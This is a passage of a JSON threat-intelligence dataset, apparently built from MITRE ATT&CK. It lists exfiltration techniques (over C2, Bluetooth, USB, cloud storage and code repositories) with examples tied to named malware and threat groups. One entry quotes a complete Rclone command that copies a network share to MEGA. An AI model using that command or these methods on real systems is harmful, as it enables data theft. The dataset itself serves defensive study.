HTTP POST headers."}, {"id": "S0050", "name": "CosmicDuke", "description": "CosmicDuke exfiltrates collected files over FTP or WebDAV. Exfiltration servers can be separately configured from C2 servers."}, {"id": "S0281", "name": "Dok", "description": "Dok exfiltrates logs of its execution stored in the /tmp folder over FTP using the curl command."}, {"id": "G0037", "name": "FIN6", "description": "FIN6 has sent stolen payment card data to remote servers via HTTP POSTs."}, {"id": "G0061", "name": "FIN8", "description": "FIN8 has used FTP to exfiltrate collected data."}, {"id": "S0095", "name": "ftp", "description": "ftp may be used to exfiltrate data separate from the main command and control protocol."}, {"id": "S0487", "name": "Kessel", "description": "Kessel can exfiltrate credentials and other information via HTTP POST request, TCP, and DNS."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has used FTP to exfiltrate reconnaissance data out."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group malware SierraBravo-Two generates an email message via SMTP containing information about newly infected victims."}, {"id": "G0049", "name": "OilRig", "description": "OilRig has exfiltrated data over FTP separately from its primary C2 channel over DNS."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has used ftp for exfiltration."}, {"id": "S1040", "name": "Rclone", "description": "Rclone can exfiltrate data over FTP or HTTP, including HTTP via WebDAV."}, {"id": "S0125", "name": "Remsec", "description": "Remsec can exfiltrate data via a DNS tunnel or email, separately from its C2 channel."}, {"id": "S1124", "name": "SocGholish", "description": "SocGholish can exfiltrate data directly to its C2 domain via HTTP."}, {"id": "G0076", "name": "Thrip", "description": "Thrip has used WinSCP to exfiltrate data from a targeted organization over FTP."}, {"id": "S1116", "name": "WARPWIRE", "description": "WARPWIRE can send captured credentials to C2 via HTTP GET or POST requests."}, {"id": "S0466", "name": "WindTail", "description": "WindTail has the ability to automatically exfiltrate files using the macOS built-in utility /usr/bin/curl."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has exfiltrated victim information using FTP."}]}]}, {"name": "Exfiltration Over C2 Channel", "description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "detailed_description": "Adversaries may steal data by exfiltrating it over an existing command and control channel. Stolen data is encoded into the normal communications channel using the same protocol as command and control communications.", "id": "T1041", "examples": [{"id": "S0045", "name": "ADVSTORESHELL", "description": "ADVSTORESHELL exfiltrates data over the same channel used for C2."}, {"id": "G1030", "name": "Agrius", "description": "Agrius exfiltrated staged data using tools such as Putty and WinSCP, communicating with command and control servers."}, {"id": "S1025", "name": "Amadey", "description": "Amadey has sent victim data to its C2 servers."}, {"id": "S0584", "name": "AppleJeus", "description": "AppleJeus has exfiltrated collected host information to a C2 server."}, {"id": "S0622", "name": "AppleSeed", "description": "AppleSeed can exfiltrate files via the C2 channel."}, {"id": "G0022", "name": "APT3", "description": "APT3 has a tool that exfiltrates data over the C2 channel."}, {"id": "G0050", "name": "APT32", "description": "APT32's backdoor has exfiltrated data using the already opened channel with its C&C server."}, {"id": "G0087", "name": "APT39", "description": "APT39 has exfiltrated stolen victim data through C2 communications."}, {"id": "S0373", "name": "Astaroth", "description": "Astaroth exfiltrates collected information from its r1.log file to the external C2 server. "}, {"id": "S0438", "name": "Attor", "description": "Attor has exfiltrated data over the C2 channel."}, {"id": "S1029", "name": "AuTo Stealer", "description": "AuTo Stealer can exfiltrate data over actor-controlled C2 servers via HTTP or TCP."}, {"id": "S0031", "name": "BACKSPACE", "description": "Adversaries can direct BACKSPACE to upload files to the C2 Server."}, {"id": "S1081", "name": "BADHATCH", "description": "BADHATCH can exfiltrate data over the C2 channel."}, {"id": "S0234", "name": "Bandook", "description": "Bandook can upload files from a victim's machine over the C2 channel."}, {"id": "S0239", "name": "Bankshot", "description": "Bankshot exfiltrates data over its C2 channel."}, {"id": "S0268", "name": "Bisonal", "description": "Bisonal has added the exfiltrated data to the URL over the C2 channel."}, {"id": "S0520", "name": "BLINDINGCAN", "description": "BLINDINGCAN has sent user and system information to a C2 server via HTTP POST requests."}, {"id": "S0657", "name": "BLUELIGHT", "description": "BLUELIGHT has exfiltrated data over its C2 channel."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon uploads files and data from a compromised host over the existing C2 channel."}, {"id": "S1039", "name": "Bumblebee", "description": "Bumblebee can send collected data in JSON format to C2."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used its Cloudflare services C2 channels for data exfiltration."}, {"id": "S0077", "name": "CallMe", "description": "CallMe exfiltrates data to its C2 server over the same protocol as C2 communications."}, {"id": "S0351", "name": "Cannon", "description": "Cannon exfiltrates collected data over email via SMTP/S and POP3/S C2 channels."}, {"id": "S0484", "name": "Carberp", "description": "Carberp has exfiltrated data via HTTP to already established C2 servers."}, {"id": "S0572", "name": "Caterpillar WebShell", "description": "Caterpillar WebShell can upload files over the C2 channel."}, {"id": "S0674", "name": "CharmPower", "description": "CharmPower can exfiltrate gathered data to a hardcoded C2 URL via HTTP POST."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has used Cobalt Strike C2 beacons for data exfiltration."}, {"id": "S1149", "name": "CHIMNEYSWEEP", "description": "CHIMNEYSWEEP  can upload collected files to the command-and-control server."}, {"id": "S0667", "name": "Chrommme", "description": "Chrommme can exfiltrate collected data via C2."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has exfiltrated stolen files to its C2 server."}, {"id": "S1024", "name": "CreepySnail", "description": "CreepySnail can connect to C2 for data exfiltration."}, {"id": "S0115", "name": "Crimson", "description": "Crimson can exfiltrate stolen information over its C2."}, {"id": "S0538", "name": "Crutch", "description": "Crutch can exfiltrate data over the primary C2 channel (Dropbox HTTP API)."}, {"id": "S1153", "name": "Cuckoo Stealer", "description": "Cuckoo Stealer can send information about the targeted system to C2 including captured passwords, OS build, hostname, and username."}, {"id": "G1012", "name": "CURIUM", "description": "CURIUM has used IMAP and SMTPS for exfiltration via tools such as IMAPLoader."}, {"id": "S0687", "name": "Cyclops Blink", "description": "Cyclops Blink has the ability to upload exfiltrated files to a C2 server."}, {"id": "S1111", "name": "DarkGate", "description": "DarkGate uses existing command and control channels to retrieve captured cryptocurrency wallet credentials."}, {"id": "S1021", "name": "DnsSystem", "description": "DnsSystem can exfiltrate collected data to its C2 server."}, {"id": "S0600", "name": "Doki", "description": "Doki has used Ngrok to establish C2 and exfiltrate data."}, {"id": "S0502", "name": "Drovorub", "description": "Drovorub can exfiltrate files over C2 infrastructure."}, {"id": "S1159", "name": "DUSTTRAP", "description": "DUSTTRAP can exfiltrate collected data over C2 channels."}, {"id": "S0062", "name": "DustySky", "description": "DustySky has exfiltrated data to the C2 server."}, {"id": "S0024", "name": "Dyre", "description": "Dyre has the ability to send information staged on a compromised host externally to C2."}, {"id": "S0377", "name": "Ebury", "description": "Ebury exfiltrates a list of outbound and inbound SSH sessions using OpenSSH's known_host files and wtmp records. Ebury can exfiltrate SSH credentials through custom DNS queries or use the command Xcat to send the process's ssh session's credentials to the C2 server."}, {"id": "S0367", "name": "Emotet", "description": "Emotet has exfiltrated data over its C2 channel."}, {"id": "S0363", "name": "Empire", "description": "Empire can send data gathered from a target through the command and control channel."}, {"id": "S0568", "name": "EVILNUM", "description": "EVILNUM can upload files over the C2 channel from the infected host."}, {"id": "S0696", "name": "Flagpro", "description": "Flagpro has exfiltrated data to the C2 server."}, {"id": "S0381", "name": "FlawedAmmyy", "description": "FlawedAmmyy has sent data collected from a compromised host to its C2 servers."}, {"id": "S0661", "name": "FoggyWeb", "description": "FoggyWeb can remotely exfiltrate sensitive information from a compromised AD FS server."}, {"id": "C0001", "name": "Frankenstein", "description": "During Frankenstein, the threat actors collected information via Empire, which sent the data back to the adversary's C2."}, {"id": "S1044", "name": "FunnyDream", "description": "FunnyDream can execute commands, including gathering user information, and send the results to C2."}, {"id": "G0093", "name": "GALLIUM", "description": "GALLIUM used Web shells and HTRAN for C2 and to exfiltrate data."}, {"id": "G0047", "name": "Gamaredon Group", "description": "A Gamaredon Group file stealer can transfer collected files to a hardcoded C2 server."}, {"id": "S0493", "name": "GoldenSpy", "description": "GoldenSpy has exfiltrated host environment information to an external C2 domain via port 9006."}, {"id": "S0588", "name": "GoldMax", "description": "GoldMax can exfiltrate files over the existing C2 channel."}, {"id": "S0477", "name": "Goopy", "description": "Goopy has the ability to exfiltrate data over the Microsoft Outlook C2 channel."}, {"id": "S0531", "name": "Grandoreiro", "description": "Grandoreiro can send data it retrieves to the C2 server."}, {"id": "S0632", "name": "GrimAgent", "description": "GrimAgent has sent data related to a compromise host over its C2 channel."}, {"id": "S0391", "name": "HAWKBALL", "description": "HAWKBALL has sent system information and files over the C2 channel."}, {"id": "G0126", "name": "Higaisa", "description": "Higaisa exfiltrated data over its C2 channel."}, {"id": "C0038", "name": "HomeLand Justice", "description": "During HomeLand Justice, threat actors used HTTP to transfer data from compromised Exchange servers."}, {"id": "S0376", "name": "HOPLIGHT", "description": "HOPLIGHT has used its C2 channel to exfiltrate data."}, {"id": "S0431", "name": "HotCroissant", "description": "HotCroissant has the ability to download files from the infected host to the command and control (C2) server."}, {"id": "S1022", "name": "IceApple", "description": "IceApple's Multi File Exfiltrator module can exfiltrate multiple files from a compromised host as an HTTP response over C2."}, {"id": "S0434", "name": "Imminent Monitor", "description": "Imminent Monitor has uploaded a file containing debugger logs, network information and system information to the C2."}, {"id": "S0604", "name": "Industroyer", "description": "Industroyer sends information about hardware profiles and previously-received commands back to the C2 server in a POST-request."}, {"id": "S1132", "name": "IPsec Helper", "description": "IPsec Helper exfiltrates specific files through its command and control framework."}, {"id": "G0004", "name": "Ke3chang", "description": "Ke3chang transferred compressed and encrypted RAR files containing exfiltration through the established backdoor command and control channel during operations."}, {"id": "S0487", "name": "Kessel", "description": "Kessel has exfiltrated information gathered from the infected system to the C2 server."}, {"id": "S1020", "name": "Kevin", "description": "Kevin can send data from the victim host through a DNS C2 channel."}, {"id": "S0526", "name": "KGH_SPY", "description": "KGH_SPY can exfiltrate collected information from the host to the C2 server."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has exfiltrated data over its C2 channel."}, {"id": "S0356", "name": "KONNI", "description": "KONNI has sent data and files to its C2 server."}, {"id": "S1075", "name": "KOPILUWAK", "description": "KOPILUWAK has exfiltrated collected data to its C2 via POST requests."}, {"id": "S1160", "name": "Latrodectus", "description": "Latrodectus can exfiltrate encrypted system information to the C2 server."}, {"id": "G0032", "name": "Lazarus Group", "description": "Lazarus Group has exfiltrated data and files over a C2 channel through its various tools and malware."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has exfiltrated data over its C2 channel."}, {"id": "S0395", "name": "LightNeuron", "description": "LightNeuron exfiltrates data over its email C2 channel."}, {"id": "S0680", "name": "LitePower", "description": "LitePower can send collected data, including screenshots, over its C2 channel."}, {"id": "S0447", "name": "Lokibot", "description": "Lokibot has the ability to initiate contact with command and control (C2) to exfiltrate stolen data."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has used malware that exfiltrates stolen data to its C2 server."}, {"id": "S1142", "name": "LunarMail", "description": "LunarMail can use email image attachments with embedded data for receiving C2 commands and data exfiltration."}, {"id": "S0409", "name": "Machete", "description": "Machete's collected data is exfiltrated over the same channel used for C2."}, {"id": "S1016", "name": "MacMa", "description": "MacMa exfiltrates data from a supplied path over its C2 channel."}, {"id": "S1060", "name": "Mafalda", "description": "Mafalda can send network system data and files to its C2 server."}, {"id": "S1156", "name": "Manjusaka", "description": "Manjusaka data exfiltration takes place over HTTP channels."}, {"id": "S0652", "name": "MarkiRAT", "description": "MarkiRAT can exfiltrate locally stored data via its C2."}, {"id": "S0459", "name": "MechaFlounder", "description": "MechaFlounder has the ability to send the compromised user's account name and hostname within a URL to C2."}, {"id": "S1059", "name": "metaMain", "description": "metaMain can upload collected files and data to its C2 server."}, {"id": "S0455", "name": "Metamorfo", "description": "Metamorfo can send the data it collects to the C2 server."}, {"id": "S0084", "name": "Mis-Type", "description": "Mis-Type has transmitted collected files and data to its C2 server."}, {"id": "S0083", "name": "Misdat", "description": "Misdat has uploaded files and data to its C2 servers."}, {"id": "S1122", "name": "Mispadu", "description": "Mispadu can sends the collected financial data to the C2 server."}, {"id": "S0079", "name": "MobileOrder", "description": "MobileOrder exfiltrates data to its C2 server over the same protocol as C2 communications."}, {"id": "S1026", "name": "Mongall", "description": "Mongall can upload files and information from a compromised host to its C2 server."}, {"id": "G0069", "name": "MuddyWater", "description": "MuddyWater has used C2 infrastructure to receive exfiltrated data."}, {"id": "S0034", "name": "NETEAGLE", "description": "NETEAGLE is capable of reading files over the C2 channel."}, {"id": "S1090", "name": "NightClub", "description": "NightClub can use SMTP and DNS for file exfiltration and C2."}, {"id": "S0385", "name": "njRAT", "description": "njRAT has used HTTP to receive stolen information from the infected machine."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has uploaded stolen files and data from a victim's machine over its C2 channel."}, {"id": "S0439", "name": "Okrum", "description": "Data exfiltration is done by Okrum using the already opened channel with the C2 server."}, {"id": "S0264", "name": "OopsIE", "description": "OopsIE can upload files from the victim's machine to its C2 server."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group exfiltrated data from a compromised host to actor-controlled C2 servers."}, {"id": "C0006", "name": "Operation Honeybee", "description": "During Operation Honeybee, the threat actors uploaded stolen files to their C2 servers."}, {"id": "C0014", "name": "Operation Wocao", "description": "During Operation Wocao, threat actors used the XServer backdoor to exfiltrate data."}, {"id": "S1017", "name": "OutSteel", "description": "OutSteel can upload files from a compromised host over its C2 channel."}, {"id": "S1050", "name": "PcShare", "description": "PcShare can upload files and information from a compromised host to its C2 servers."}, {"id": "S0587", "name": "Penquin", "description": "Penquin can execute the command code do_upload to send files to C2."}, {"id": "S1145", "name": "Pikabot", "description": "During the initial Pikabot command and control check-in, Pikabot will transmit collected system information encrypted using RC4."}, {"id": "S1031", "name": "PingPull", "description": "PingPull has the ability to exfiltrate stolen victim data through its C2 channel."}, {"id": "S0428", "name": "PoetRAT", "description": "PoetRAT has exfiltrated data over the C2 channel."}, {"id": "S0441", "name": "PowerShower", "description": "PowerShower has used a PowerShell document stealer module to pack and exfiltrate .txt, .pdf, .xls or .doc files smaller than 5MB that were modified during the past two days."}, {"id": "S0238", "name": "Proxysvc", "description": "Proxysvc performs data exfiltration over the control server channel using a custom protocol."}, {"id": "S0078", "name": "Psylo", "description": "Psylo exfiltrates data to its C2 server over the same protocol as C2 communications."}, {"id": "S0147", "name": "Pteranodon", "description": "Pteranodon exfiltrates screenshot files to its C2 server."}, {"id": "S0192", "name": "Pupy", "description": "Pupy can send screenshots files, keylogger data, files, and recorded audio back to the C2 server."}, {"id": "S0650", "name": "QakBot", "description": "QakBot can send stolen information to C2 nodes including passwords, accounts, and emails."}, {"id": "S1148", "name": "Raccoon Stealer", "description": "Raccoon Stealer uses existing HTTP-based command and control channels for exfiltration."}, {"id": "S0495", "name": "RDAT", "description": "RDAT can exfiltrate data gathered from the infected system via the established Exchange Web Services API C2 channel."}, {"id": "S0375", "name": "Remexi", "description": "Remexi performs exfiltration over BITSAdmin, which is also used for the C2 channel."}, {"id": "S0496", "name": "REvil", "description": "REvil can exfiltrate host and malware information to C2 servers."}, {"id": "S0448", "name": "Rising Sun", "description": "Rising Sun can send data gathered from the infected machine via HTTP POST request to the C2."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can send collected files back over same C2 channel."}, {"id": "S1078", "name": "RotaJakiro", "description": "RotaJakiro sends device and other collected data back to the C2 using the established C2 channels over TCP. "}, {"id": "S0085", "name": "S-Type", "description": "S-Type has uploaded data and files from a compromised host to its C2 servers."}, {"id": "G0034", "name": "Sandworm Team", "description": "Sandworm Team has sent system information to its C2 server using HTTP."}, {"id": "S0461", "name": "SDBbot", "description": "SDBbot has sent collected data from a compromised host to its C2 servers."}, {"id": "S1019", "name": "Shark", "description": "Shark has the ability to upload files from the compromised host over a DNS or HTTP C2 channel."}, {"id": "S1089", "name": "SharpDisco", "description": "SharpDisco can load a plugin to exfiltrate stolen files to SMB shares also used in C2."}, {"id": "S0445", "name": "ShimRatReporter", "description": "ShimRatReporter sent generated reports to the C2 via HTTP POST requests."}, {"id": "S0610", "name": "SideTwist", "description": "SideTwist has exfiltrated data over its C2 channel."}, {"id": "S0692", "name": "SILENTTRINITY", "description": "SILENTTRINITY can transfer files from an infected host to the C2 server."}, {"id": "S0633", "name": "Sliver", "description": "Sliver can exfiltrate files from the victim using the download command."}, {"id": "S0533", "name": "SLOTHFULMEDIA", "description": "SLOTHFULMEDIA has sent system information to a C2 server via HTTP and HTTPS POST requests."}, {"id": "S0649", "name": "SMOKEDHAM", "description": "SMOKEDHAM has exfiltrated data to its C2 server."}, {"id": "S0615", "name": "SombRAT", "description": "SombRAT has uploaded collected data and files from a compromised host to its C2 server."}, {"id": "S0543", "name": "Spark", "description": "Spark has exfiltrated data over the C2 channel."}, {"id": "S1030", "name": "Squirrelwaffle", "description": "Squirrelwaffle has exfiltrated victim data using HTTP POST requests to its C2 servers."}, {"id": "S1037", "name": "STARWHALE", "description": "STARWHALE can exfiltrate collected data to its C2 servers."}, {"id": "G0038", "name": "Stealth Falcon", "description": "After data is collected by Stealth Falcon malware, it is exfiltrated over the existing C2 channel."}, {"id": "S1034", "name": "StrifeWater", "description": "StrifeWater can send data and files from a compromised host to its C2 server."}, {"id": "S0491", "name": "StrongPity", "description": "StrongPity can exfiltrate collected documents through C2 channels."}, {"id": "S0603", "name": "Stuxnet", "description": "Stuxnet sends compromised victim information via HTTP."}, {"id": "S1042", "name": "SUGARDUMP", "description": "SUGARDUMP has sent stolen credentials and other data to its C2 server."}, {"id": "S1064", "name": "SVCReady", "description": "SVCReady can send collected data in JSON format to its C2 server."}, {"id": "S0663", "name": "SysUpdate", "description": "SysUpdate has exfiltrated data over its C2 channel."}, {"id": "S0467", "name": "TajMahal", "description": "TajMahal has the ability to send collected files over its C2."}, {"id": "S0595", "name": "ThiefQuest", "description": "ThiefQuest exfiltrates targeted file extensions in the /Users/ folder to the command and control server via unencrypted HTTP. Network packets contain a string with two pieces of information: a file path and the contents of the file in a base64 encoded string."}, {"id": "S0671", "name": "Tomiris", "description": "Tomiris can upload files matching a hardcoded set of extensions, such as .doc, .docx, .pdf, and .rar, to its C2 server."}, {"id": "S0678", "name": "Torisma", "description": "Torisma can send victim data to an actor-controlled C2 server."}, {"id": "S0266", "name": "TrickBot", "description": "TrickBot can send information about the compromised host and upload data to a hardcoded C2 server."}, {"id": "S0386", "name": "Ursnif", "description": "Ursnif has used HTTP POSTs to exfil gathered information."}, {"id": "S0476", "name": "Valak", "description": "Valak has the ability to exfiltrate data over the C2 channel."}, {"id": "S0670", "name": "WarzoneRAT", "description": "WarzoneRAT can send collected victim data to its C2 server."}, {"id": "G1035", "name": "Winter Vivern", "description": "Winter Vivern delivered a PowerShell script capable of recursively scanning victim machines looking for various file types before exfiltrating identified files via HTTP."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has exfiltrated domain credentials and network enumeration information over command and control (C2) channels."}, {"id": "S1065", "name": "Woody RAT", "description": "Woody RAT can exfiltrate files from an infected machine to its C2 server."}, {"id": "S0658", "name": "XCSSET", "description": "XCSSET exfiltrates data stolen from a system over its C2 channel."}, {"id": "S0251", "name": "Zebrocy", "description": "Zebrocy has exfiltrated data to the designated C2 server using HTTP POST requests."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has exfiltrated files via the Dropbox API C2."}, {"id": "S0086", "name": "ZLib", "description": "ZLib has sent data and files from a compromised host to its C2 servers."}], "sub_techniques": []}, {"name": "Exfiltration Over Other Network Medium", "description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.", "detailed_description": "Adversaries may attempt to exfiltrate data over a different network medium than the command and control channel. If the command and control network is a wired Internet connection, the exfiltration may occur, for example, over a WiFi connection, modem, cellular data connection, Bluetooth, or another radio frequency (RF) channel.\nAdversaries may choose to do this if they have sufficient access or proximity, and the connection might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.", "id": "T1011", "examples": [], "sub_techniques": [{"name": "Exfiltration Over Bluetooth", "description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.", "detailed_description": "Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.\nAdversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.", "id": "T1011.001", "examples": [{"id": "S0143", "name": "Flame", "description": "Flame has a module named BeetleJuice that contains Bluetooth functionality that may be used in different ways, including transmitting encoded information from the infected system over the Bluetooth protocol, acting as a Bluetooth beacon, and identifying other Bluetooth devices in the vicinity."}]}]}, {"name": "Exfiltration Over Physical Medium", "description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.", "detailed_description": "Adversaries may attempt to exfiltrate data via a physical medium, such as a removable drive. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a physical medium or device introduced by a user. Such media could be an external hard drive, USB drive, cellular phone, MP3 player, or other removable storage and processing device. The physical medium or device could be used as the final exfiltration point or to hop between otherwise disconnected systems.", "id": "T1052", "examples": [], "sub_techniques": [{"name": "Exfiltration over USB", "description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.", "detailed_description": "Adversaries may attempt to exfiltrate data over a USB connected physical device. In certain circumstances, such as an air-gapped network compromise, exfiltration could occur via a USB device introduced by a user. The USB device could be used as the final exfiltration point or to hop between otherwise disconnected systems.", "id": "T1052.001", "examples": [{"id": "S0092", "name": "Agent.btz", "description": "Agent.btz creates a file named thumb.dd on all USB flash drives connected to the victim. This file contains information about the infected system and activity logs."}, {"id": "S0409", "name": "Machete", "description": "Machete has a feature to copy files from every drive onto a removable drive in a hidden folder."}, {"id": "G0129", "name": "Mustang Panda", "description": "Mustang Panda has used a customized PlugX variant which could exfiltrate documents from air-gapped networks."}, {"id": "S0125", "name": "Remsec", "description": "Remsec contains a module to move data from airgapped networks to Internet-connected systems by using a removable USB device."}, {"id": "S0035", "name": "SPACESHIP", "description": "SPACESHIP copies staged data to removable drives when they are inserted into the system."}, {"id": "G0081", "name": "Tropic Trooper", "description": "Tropic Trooper has exfiltrated data using USB storage devices."}, {"id": "S0136", "name": "USBStealer", "description": "USBStealer exfiltrates collected files via removable media from air-gapped victims."}]}]}, {"name": "Exfiltration Over Web Service", "description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.", "detailed_description": "Adversaries may use an existing, legitimate external Web service to exfiltrate data rather than their primary command and control channel. Popular Web services acting as an exfiltration mechanism may give a significant amount of cover due to the likelihood that hosts within a network are already communicating with them prior to compromise. Firewall rules may also already exist to permit traffic to these services.\nWeb service providers also commonly use SSL/TLS encryption, giving adversaries an added level of protection.", "id": "T1567", "examples": [{"id": "S0622", "name": "AppleSeed", "description": "AppleSeed has exfiltrated files using web services."}, {"id": "G0007", "name": "APT28", "description": "APT28 can exfiltrate data over Google Drive."}, {"id": "C0017", "name": "C0017", "description": "During C0017, APT41 used Cloudflare services for data exfiltration."}, {"id": "S0547", "name": "DropBook", "description": "DropBook has used legitimate web services to exfiltrate data."}, {"id": "G0059", "name": "Magic Hound", "description": "Magic Hound has used the Telegram API sendMessage to relay data on compromised devices."}, {"id": "S0508", "name": "ngrok", "description": "ngrok has been used by threat actors to configure servers for data exfiltration."}], "sub_techniques": [{"name": "Exfiltration to Code Repository", "description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.", "detailed_description": "Adversaries may exfiltrate data to a code repository rather than over their primary command and control channel. Code repositories are often accessible via an API (ex: https://api.github.com). Access to these APIs are often over HTTPS, which gives the adversary an additional level of protection.\nExfiltration to a code repository can also provide a significant amount of cover to the adversary if it is a popular service already used by hosts within the network.", "id": "T1567.001", "examples": [{"id": "S0363", "name": "Empire", "description": "Empire can use GitHub for data exfiltration."}]}, {"name": "Exfiltration to Cloud Storage", "description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.", "detailed_description": "Adversaries may exfiltrate data to a cloud storage service rather than over their primary command and control channel. Cloud storage services allow for the storage, edit, and retrieval of data from a remote cloud storage server over the Internet.\nExamples of cloud storage services include Dropbox and Google Docs. Exfiltration to these cloud storage services can provide a significant amount of cover to the adversary if hosts within the network are already communicating with the service.", "id": "T1567.002", "examples": [{"id": "G1024", "name": "Akira", "description": "Akira will exfiltrate victim data using applications such as Rclone."}, {"id": "C0040", "name": "APT41 DUST", "description": "APT41 DUST exfiltrated collected information to OneDrive."}, {"id": "S0635", "name": "BoomBox", "description": "BoomBox can upload data to dedicated per-victim folders in Dropbox."}, {"id": "S0651", "name": "BoxCaon", "description": "BoxCaon has the capability to download folders' contents on the system and upload the results back to its Dropbox drive."}, {"id": "C0015", "name": "C0015", "description": "During C0015, the threat actors exfiltrated files and sensitive data to the MEGA cloud storage site using the Rclone command rclone.exe copy --max-age 2y \"\\\\SERVER\\Shares\" Mega:DATA -q --ignore-existing --auto-confirm --multi-thread-streams 7 --transfers 7 --bwlimit 10M."}, {"id": "G0114", "name": "Chimera", "description": "Chimera has exfiltrated stolen data to OneDrive accounts."}, {"id": "G1021", "name": "Cinnamon Tempest", "description": "Cinnamon Tempest has uploaded captured keystroke logs to the Alibaba Cloud Object Storage Service, Aliyun OSS."}, {"id": "S0660", "name": "Clambling", "description": "Clambling can send files from a victim's machine to Dropbox."}, {"id": "G0142", "name": "Confucius", "description": "Confucius has exfiltrated victim data to cloud storage service accounts."}, {"id": "S1023", "name": "CreepyDrive", "description": "CreepyDrive can use cloud services including OneDrive for data exfiltration."}, {"id": "S0538", "name": "Crutch", "description": "Crutch has exfiltrated stolen data to Dropbox."}, {"id": "G1006", "name": "Earth Lusca", "description": "Earth Lusca has used the megacmd tool to upload stolen files from a victim network to MEGA."}, {"id": "G1003", "name": "Ember Bear", "description": "Ember Bear has used tools such as Rclone to exfiltrate information from victim environments to cloud storage such as mega.nz."}, {"id": "S0363", "name": "Empire", "description": "Empire can use Dropbox for data exfiltration."}, {"id": "G0046", "name": "FIN7", "description": "FIN7 has exfiltrated stolen data to the MEGA file sharing site."}, {"id": "G0125", "name": "HAFNIUM", "description": "HAFNIUM has exfiltrated data to file sharing sites, including MEGA."}, {"id": "S0037", "name": "HAMMERTOSS", "description": "HAMMERTOSS exfiltrates data by uploading it to accounts created by the actors on Web cloud storage providers for the adversaries to retrieve later."}, {"id": "G1001", "name": "HEXANE", "description": "HEXANE has used cloud services, including OneDrive, for data exfiltration."}, {"id": "G0119", "name": "Indrik Spider", "description": "Indrik Spider has exfiltrated data using Rclone or MEGASync prior to deploying ransomware."}, {"id": "G0094", "name": "Kimsuky", "description": "Kimsuky has exfiltrated stolen files and data to actor-controlled Blogspot accounts."}, {"id": "G0065", "name": "Leviathan", "description": "Leviathan has used an uploader known as LUNCHMONEY that can exfiltrate files to Dropbox."}, {"id": "G1014", "name": "LuminousMoth", "description": "LuminousMoth has exfiltrated data to Google Drive."}, {"id": "S0340", "name": "Octopus", "description": "Octopus has exfiltrated data to file sharing sites."}, {"id": "C0022", "name": "Operation Dream Job", "description": "During Operation Dream Job, Lazarus Group used a custom build of open-source command-line dbxcli to exfiltrate stolen data to Dropbox."}, {"id": "S1102", "name": "Pcexter", "description": "Pcexter can upload stolen files to OneDrive storage accounts via HTTP POST."}, {"id": "G1005", "name": "POLONIUM", "description": "POLONIUM has exfiltrated stolen data to POLONIUM-owned OneDrive and Dropbox accounts."}, {"id": "S0629", "name": "RainyDay", "description": "RainyDay can use a file exfiltration tool to upload specific files to Dropbox."}, {"id": "S1040", "name": "Rclone", "description": "Rclone can exfiltrate data to cloud storage services such as Dropbox, Google Drive, Amazon S3, and MEGA."}, {"id": "S0240", "name": "ROKRAT", "description": "ROKRAT can send collected data to cloud storage services such as PCloud."}, {"id": "G1015", "name": "Scattered Spider", "description": "Scattered Spider has exfiltrated victim data to the MEGA file sharing site."}, {"id": "G0027", "name": "Threat Group-3390", "description": "Threat Group-3390 has exfiltrated stolen data to Dropbox."}, {"id": "G1022", "name": "ToddyCat", "description": "ToddyCat has used a DropBox uploader to exfiltrate stolen files."}, {"id": "G0010", "name": "Turla", "description": "Turla has used WebDAV to upload stolen USB files to a cloud drive. Turla has also exfiltrated stolen files to OneDrive and 4shared."}, {"id": "G0102", "name": "Wizard Spider", "description": "Wizard Spider has exfiltrated stolen victim data to various cloud storage providers."}, {"id": "G0128", "name": "ZIRCONIUM", "description": "ZIRCONIUM has exfiltrated stolen data to Dropbox."}]}, {"name": "Exfiltration to Text Storage Sites", "description": "Adversaries may exfiltrate data to text storage sites instead of their primary command and control channel. Text storage sites, such as pastebin[.]com, are commonly used by developers to share code and 